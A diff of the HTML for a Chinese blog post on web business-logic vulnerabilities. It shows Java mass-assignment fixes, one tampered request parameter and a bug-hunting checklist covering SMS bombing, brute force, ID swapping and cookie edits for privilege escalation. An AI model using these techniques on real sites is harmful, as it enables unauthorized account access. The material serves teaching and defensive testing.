-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserRegistrationFormDTO</span> <span class="token punctuation">{</span>
-     <span class="token keyword">private</span> <span class="token class-name">String</span> username<span class="token punctuation">;</span>
-     <span class="token keyword">private</span> <span class="token class-name">String</span> password<span class="token punctuation">;</span>
-     <span class="token keyword">private</span> <span class="token class-name">String</span> email<span class="token punctuation">;</span>
+<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserRegistrationFormDTO</span> {
+     <span class="hljs-keyword">private</span> String username;
+     <span class="hljs-keyword">private</span> String password;
+     <span class="hljs-keyword">private</span> String email;
 
-     <span class="token comment">//Getters &amp; Setters</span>
-   <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+     <span class="hljs-comment">//Getters &amp; Setters</span>
+   }</code></pre>
 <p>或者可以修改controller层，仅接收用户可以修改的参数：</p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/addUserInfo"</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">POST</span><span class="token punctuation">)</span>
-  <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">submit</span><span class="token punctuation">(</span><span class="token class-name">String</span> username<span class="token punctuation">,</span><span class="token class-name">String</span> phone<span class="token punctuation">,</span><span class="token class-name">String</span> email<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-     userService<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span>phone<span class="token punctuation">,</span>email<span class="token punctuation">)</span><span class="token punctuation">;</span>
-     <span class="token keyword">return</span> <span class="token string">"successPage"</span><span class="token punctuation">;</span>
-  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = "/addUserInfo", method = RequestMethod.POST)</span>
+  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">submit</span><span class="hljs-params">(String username,String phone,String email)</span> {
+     userService.add(username,phone,email);
+     <span class="hljs-keyword">return</span> <span class="hljs-string">"successPage"</span>;
+  }</code></pre>
 <p>也可以设置白名单：</p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span>
-  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserController</span>
-  <span class="token punctuation">{</span>
-     <span class="token annotation punctuation">@InitBinder</span>
-     <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">initBinder</span><span class="token punctuation">(</span><span class="token class-name">WebDataBinder</span> binder<span class="token punctuation">,</span> <span class="token class-name">WebRequest</span> request<span class="token punctuation">)</span>
-     <span class="token punctuation">{</span>
-        binder<span class="token punctuation">.</span><span class="token function">setDisallowedFields</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"isAdmin"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-     <span class="token punctuation">}</span>
+<pre><code class="hljs java"><span class="hljs-meta">@Controller</span>
+  <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span>
+  {
+     <span class="hljs-meta">@InitBinder</span>
+     <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initBinder</span><span class="hljs-params">(WebDataBinder binder, WebRequest request)</span>
+     {
+        binder.setDisallowedFields([<span class="hljs-string">"isAdmin"</span>]);
+     }
 
-     <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
-  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="3-0-SRC中的逻辑漏洞总结">3.0 SRC中的逻辑漏洞总结</h3>
-<pre class="line-numbers language-none"><code class="language-none">1. 注册：
+     ...
+  }</code></pre>
+<h3 id="30-src中的逻辑漏洞总结">3.0 SRC中的逻辑漏洞总结</h3>
+<pre><code class="hljs plaintext">1. 注册：
     短信轰炸
     验证码安全问题
     密码爆破
@@ -1137,938 +850,460 @@ username=daheike&amp;password=bypass&amp;email=test@test.com&amp;userid=adminid<
 如果程序对用户标识进行了hash或者加密，而无法破解用的什么方式的话，就无法通过遍历ID来获取其它用户的信息了，此时可以尝试注册两个账号，通过替换两个ID加密后的值，判断程序是否对权限进行了验证，如果没有，也会存在越权问题
 
 5. 垂直越权
-观察cookie中的session字段，可能某些字段或者参数代表身份，尝试修改  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+观察cookie中的session字段，可能某些字段或者参数代表身份，尝试修改</code></pre>
 
-                
-            </div>
-            <hr/>
-
-            
-
-    <div class="reprint" id="reprint-statement">
-        
-            <div class="reprint__author">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-user">
-                        文章作者:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">hybcx</a>
-                </span>
-            </div>
-            <div class="reprint__type">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-link">
-                        文章链接:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    <a href="http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/">http://hybcx.xyz/2023/07/29/qian-xi-luo-ji-lou-dong/</a>
-                </span>
-            </div>
-            <div class="reprint__notice">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-copyright">
-                        版权声明:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    本博客所有文章除特別声明外，均采用
-                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
-                    许可协议。转载请注明来源
-                    <a href="/about" target="_blank">hybcx</a>
-                    !
-                </span>
-            </div>
-        
-    </div>
-
-    <script async defer>
-      document.addEventListener("copy", function (e) {
-        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
-        M.toast({html: toastHTML})
-      });
-
-      function navToReprintStatement() {
-        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
-      }
-    </script>
-
-
-
-            <div class="tag_share" style="display: block;">
-                <div class="post-meta__tag-list" style="display: inline-block;">
-                    
-                        <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                        </div>
-                    
-                </div>
-                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
-                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
-<div id="article-share">
-
-    
-    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
-    <script src="/libs/share/js/social-share.min.js"></script>
-    
-
-    
-
+<div class="article-footer slide-up fs14">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
 </div>
-
-                </div>
-            </div>
-            
-                <div id="reward">
-    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
-
-    <!-- Modal Structure -->
-    <div id="rewardModal" class="modal">
-        <div class="modal-content">
-            <a class="close modal-close"><i class="fas fa-times"></i></a>
-            <h4 class="reward-title">随缘，看各位佬的心情</h4>
-            <div class="reward-content">
-                <div class="reward-tabs">
-                    <ul class="tabs row">
-                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
-                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
-                    </ul>
-                    <div id="alipay">
-                        <img src="/medias/reward/alipay.png" class="reward-img" alt="支付宝打赏二维码">
-                    </div>
-                    <div id="wechat">
-                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-</div>
-
-<script>
-    $(function () {
-        $('.tabs').tabs();
-    });
-</script>
-
-            
-        </div>
-    </div>
-
-    
-
-    
-
-    
-
-    
-
-    
-        <style>
-    .valine-card {
-        margin: 1.5rem auto;
-    }
-
-    .valine-card .card-content {
-        padding: 20px 20px 5px 20px;
-    }
-
-    #vcomments textarea {
-        box-sizing: border-box;
-        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
-    }
-
-    #vcomments p {
-        margin: 2px 2px 10px;
-        font-size: 1.05rem;
-        line-height: 1.78rem;
-    }
-
-    #vcomments blockquote p {
-        text-indent: 0.2rem;
-    }
-
-    #vcomments a {
-        padding: 0 2px;
-        color: #4cbf30;
-        font-weight: 500;
-        text-decoration: none;
-    }
-
-    #vcomments img {
-        max-width: 100%;
-        height: auto;
-        cursor: pointer;
-    }
-
-    #vcomments ol li {
-        list-style-type: decimal;
-    }
-
-    #vcomments ol,
-    ul {
-        display: block;
-        padding-left: 2em;
-        word-spacing: 0.05rem;
-    }
-
-    #vcomments ul li,
-    ol li {
-        display: list-item;
-        line-height: 1.8rem;
-        font-size: 1rem;
-    }
-
-    #vcomments ul li {
-        list-style-type: disc;
-    }
-
-    #vcomments ul ul li {
-        list-style-type: circle;
-    }
-
-    #vcomments table, th, td {
-        padding: 12px 13px;
-        border: 1px solid #dfe2e5;
-    }
-
-    #vcomments table, th, td {
-        border: 0;
-    }
-
-    table tr:nth-child(2n), thead {
-        background-color: #fafafa;
-    }
-
-    #vcomments table th {
-        background-color: #f2f2f2;
-        min-width: 80px;
-    }
-
-    #vcomments table td {
-        min-width: 80px;
-    }
-
-    #vcomments h1 {
-        font-size: 1.85rem;
-        font-weight: bold;
-        line-height: 2.2rem;
-    }
-
-    #vcomments h2 {
-        font-size: 1.65rem;
-        font-weight: bold;
-        line-height: 1.9rem;
-    }
-
-    #vcomments h3 {
-        font-size: 1.45rem;
-        font-weight: bold;
-        line-height: 1.7rem;
-    }
-
-    #vcomments h4 {
-        font-size: 1.25rem;
-        font-weight: bold;
-        line-height: 1.5rem;
-    }
-
-    #vcomments h5 {
-        font-size: 1.1rem;
-        font-weight: bold;
-        line-height: 1.4rem;
-    }
-
-    #vcomments h6 {
-        font-size: 1rem;
-        line-height: 1.3rem;
-    }
-
-    #vcomments p {
-        font-size: 1rem;
-        line-height: 1.5rem;
-    }
-
-    #vcomments hr {
-        margin: 12px 0;
-        border: 0;
-        border-top: 1px solid #ccc;
-    }
-
-    #vcomments blockquote {
-        margin: 15px 0;
-        border-left: 5px solid #42b983;
-        padding: 1rem 0.8rem 0.3rem 0.8rem;
-        color: #666;
-        background-color: rgba(66, 185, 131, .1);
-    }
-
-    #vcomments pre {
-        font-family: monospace, monospace;
-        padding: 1.2em;
-        margin: .5em 0;
-        background: #272822;
-        overflow: auto;
-        border-radius: 0.3em;
-        tab-size: 4;
-    }
-
-    #vcomments code {
-        font-family: monospace, monospace;
-        padding: 1px 3px;
-        font-size: 0.92rem;
-        color: #e96900;
-        background-color: #f8f8f8;
-        border-radius: 2px;
-    }
-
-    #vcomments pre code {
-        font-family: monospace, monospace;
-        padding: 0;
-        color: #e8eaf6;
-        background-color: #272822;
-    }
-
-    #vcomments pre[class*="language-"] {
-        padding: 1.2em;
-        margin: .5em 0;
-    }
-
-    #vcomments code[class*="language-"],
-    pre[class*="language-"] {
-        color: #e8eaf6;
-    }
-
-    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
-        position: inherit;
-        margin-left: -1.3rem;
-        margin-right: 0.4rem;
-        margin-top: -1px;
-        vertical-align: middle;
-        left: unset;
-        visibility: visible;
-    }
-
-    #vcomments b,
-    strong {
-        font-weight: bold;
-    }
-
-    #vcomments dfn {
-        font-style: italic;
-    }
-
-    #vcomments small {
-        font-size: 85%;
-    }
-
-    #vcomments cite {
-        font-style: normal;
-    }
-
-    #vcomments mark {
-        background-color: #fcf8e3;
-        padding: .2em;
-    }
-
-    #vcomments table, th, td {
-        padding: 12px 13px;
-        border: 1px solid #dfe2e5;
-    }
-
-    table tr:nth-child(2n), thead {
-        background-color: #fafafa;
-    }
-
-    #vcomments table th {
-        background-color: #f2f2f2;
-        min-width: 80px;
-    }
-
-    #vcomments table td {
-        min-width: 80px;
-    }
-
-    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
-        position: inherit;
-        margin-left: -1.3rem;
-        margin-right: 0.4rem;
-        margin-top: -1px;
-        vertical-align: middle;
-        left: unset;
-        visibility: visible;
-    }
-</style>
-
-<div class="card valine-card" data-aos="fade-up">
-    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
-        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
-        <span>评论</span>
-    </div>
-    <div id="vcomments" class="card-content" style="display: grid">
-    </div>
-</div>
-
-<script src="/libs/valine/av-min.js"></script>
-<script src="/libs/valine/Valine.min.js"></script>
-<script>
-    new Valine({
-        el: '#vcomments',
-        appId: 'u0n6SeKEfoilg30pN4VxouXR-MdYXbMMI',
-        appKey: '36SdcVNDUm7oJBLF0OpXO4ut',
-        serverURLs: 'https://u0n6seke.api.lncldglobal.com',
-        notify: 'false' === 'true',
-        verify: 'false' === 'true',
-        visitor: 'false' === 'true',
-        avatar: 'mm',
-        pageSize: '10',
-        lang: 'zh-cn',
-        placeholder: 'just go go'
-    });
-</script>
-
-<!--酷Q推送-->
-
-
-    
-
-    
-
-    
-
-    
-
-    
-
-<article id="prenext-posts" class="prev-next articles">
-    <div class="row article-row">
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
-            <div class="card">
-                <a href="/2023/08/02/easyupload/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="攻防世界-easyupload">
-                        
-                        <span class="card-title">攻防世界-easyupload</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-08-02
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" class="post-category">
-                                    攻防世界
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="log4j2远程命令执行漏洞复现（CVE-2021-44228）">
-                        
-                        <span class="card-title">log4j2远程命令执行漏洞复现（CVE-2021-44228）</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-29
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/CVE%E6%BC%8F%E6%B4%9E/" class="post-category">
-                                    CVE漏洞
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/CVE/">
-                        <span class="chip bg-color">CVE</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
+    </section>
     </div>
 </article>
+<div class="related-wrap slide-up" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2023/08/02/easyupload/">攻防世界-easyupload</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/">log4j2远程命令执行漏洞复现（CVE-2021-44228）</a></div></section></div>
 
+<div class="related-wrap slide-up" id="related-posts">
+    <section class='header'>
+      <div class='title cap theme'>您可能感兴趣的文章</div>
+    </section>
+    <section class='body'>
+    <div class="related-posts"><a class="item" href="\2023\07\26\cors-kua-yu-lou-dong\" title="CORS跨域漏洞"><span class="title">CORS跨域漏洞</span></a></div></section></div>
+
+
+  <div class="related-wrap md-text slide-up" id="comments">
+    <section class='header cmt-title cap theme'>
+      <p>感谢大佬们的不吝赐教！</p>
+
+    </section>
+    <section class='body cmt-body twikoo'>
+      
+
+<div id="twikoo_container"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+    </section>
+  </div>
+
+
+
+<footer class="page-footer slide-up footnote"><hr><div class="text"><p><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<p>本站由 <a href="/">hybcx</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1">Stellar 1.28.1</a> 主题创建。<br>
+本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper slide-up toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"><span class="toc-text">1. 漏洞介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#11-%E6%88%90%E5%9B%A0"><span class="toc-text">1.1 成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-%E5%88%86%E6%9E%90"><span class="toc-text">1.2 分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3"><span class="toc-text">2. 逻辑漏洞详解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#21-%E5%B8%B8%E8%A7%81%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-text">2.1 常见的逻辑漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#22-%E5%A6%82%E4%BD%95%E6%8C%96%E6%8E%98%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-text">2.2 如何挖掘逻辑漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#23-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E"><span class="toc-text">2.3 身份验证漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%BC%8F%E6%B4%9E"><span class="toc-text">1. 暴力破解漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-session%E5%9B%BA%E5%AE%9A%E6%94%BB%E5%87%BB"><span class="toc-text">2. Session固定攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98"><span class="toc-text">漏洞实战</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B"><span class="toc-text">复现过程</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-cookie%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E"><span class="toc-text">3. Cookie欺骗漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98"><span class="toc-text">漏洞实战</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#24-%E6%9D%83%E9%99%90%E7%B1%BB%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-text">2.4 权限类逻辑漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%B9%B3%E8%A1%8C%E6%9D%83%E9%99%90%E8%B7%A8%E8%B6%8A"><span class="toc-text">1. 平行权限跨越</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93"><span class="toc-text">漏洞总结</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%9E%82%E7%9B%B4%E6%9D%83%E9%99%90%E8%B7%A8%E8%B6%8A"><span class="toc-text">2. 垂直权限跨越</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#couchdb-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83cve-2017-12635"><span class="toc-text">Couchdb 垂直越权（CVE-2017-12635）</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%9C%AA%E7%BB%8F%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-text">3. 未经授权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#docker-daemon-api%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="toc-text">Docker daemon api未授权访问漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#25-%E5%9B%BE%E5%BD%A2%E9%AA%8C%E8%AF%81%E7%A0%81%E6%BC%8F%E6%B4%9E"><span class="toc-text">2.5 图形验证码漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%9B%BE%E5%BD%A2%E9%AA%8C%E8%AF%81%E7%A0%81%E7%AA%81%E7%A0%B4"><span class="toc-text">1. 图形验证码突破</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#26-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-text">2.6 找回密码逻辑漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E6%BC%8F%E6%B4%9E"><span class="toc-text">1. 密码找回漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#27-%E4%B8%9A%E5%8A%A1%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9%E6%BC%8F%E6%B4%9E"><span class="toc-text">2.7 业务数据篡改漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%B8%9A%E5%8A%A1%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9%E8%B5%8B%E5%80%BC%E5%8F%8D%E5%86%B2"><span class="toc-text">1. 业务数据篡改（赋值反冲）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#dami__cms-0%E5%85%83%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E"><span class="toc-text">dami__cms-0元支付漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#28-%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-text">2.8 执行顺序逻辑漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F%E7%AF%A1%E6%94%B9"><span class="toc-text">1. 执行顺序篡改</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#29-%E5%85%B6%E4%BB%96%E7%B1%BB%E5%9E%8B%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-text">2.9 其他类型逻辑漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E"><span class="toc-text">1. 条件竞争漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%95%B0%E6%8D%AE%E5%8C%85%E9%87%8D%E6%94%BE%E6%BC%8F%E6%B4%9E"><span class="toc-text">2. 数据包重放漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%8F%82%E6%95%B0%E7%BB%91%E5%AE%9A%E6%BC%8F%E6%B4%9E"><span class="toc-text">3. 参数绑定漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#30-src%E4%B8%AD%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93"><span class="toc-text">3.0 SRC中的逻辑漏洞总结</span></a></li></ol></li></ol></div><div class="widget-footer">
+
+<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M10.46 1.25h3.08c1.603 0 2.86 0 3.864.095c1.023.098 1.861.3 2.6.752a5.75 5.75 0 0 1 1.899 1.899c.452.738.654 1.577.752 2.6c.095 1.004.095 2.261.095 3.865v1.067c0 1.141 0 2.036-.05 2.759c-.05.735-.153 1.347-.388 1.913a5.75 5.75 0 0 1-3.112 3.112c-.805.334-1.721.408-2.977.43a10.81 10.81 0 0 0-.929.036c-.198.022-.275.054-.32.08c-.047.028-.112.078-.224.232c-.121.166-.258.396-.476.764l-.542.916c-.773 1.307-2.69 1.307-3.464 0l-.542-.916a10.605 10.605 0 0 0-.476-.764c-.112-.154-.177-.204-.224-.232c-.045-.026-.122-.058-.32-.08c-.212-.023-.49-.03-.93-.037c-1.255-.021-2.171-.095-2.976-.429A5.75 5.75 0 0 1 1.688 16.2c-.235-.566-.338-1.178-.389-1.913c-.049-.723-.049-1.618-.049-2.76v-1.066c0-1.604 0-2.86.095-3.865c.098-1.023.3-1.862.752-2.6a5.75 5.75 0 0 1 1.899-1.899c.738-.452 1.577-.654 2.6-.752C7.6 1.25 8.857 1.25 10.461 1.25M6.739 2.839c-.914.087-1.495.253-1.959.537A4.25 4.25 0 0 0 3.376 